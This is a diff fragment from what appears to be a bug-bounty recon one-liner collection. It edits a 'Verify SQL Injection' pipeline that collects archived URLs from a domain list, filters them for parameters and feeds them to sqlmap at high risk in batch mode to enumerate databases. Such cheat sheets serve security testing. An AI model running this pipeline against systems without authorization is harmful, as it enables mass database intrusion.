@@ -107,7 +107,7 @@ echo scope.com | assetfinder -subs-only | waybackurls | grep 'wp-content' | http
 ### Verify SQL Injection
 
 ```
-for scope in $(cat domains.txt);do curl "https://web.archive.org/cdx/search/cdx?url=*.$scope/*&output=text&fl=original&collapse=urlkey" | grep "?[a-z0-9]*=" | sed -e 's/:80//' | gf sqli | sqlmap --risk 3 --batch --dbs;done
+cat domains.txt | waybackurls | grep "?[a-z0-9]*=" | sed -e 's/:80//' | gf sqli | sqlmap --risk 3 --batch --dbs
 ```
 
 ### Easy Open Redirect by endpoint injection
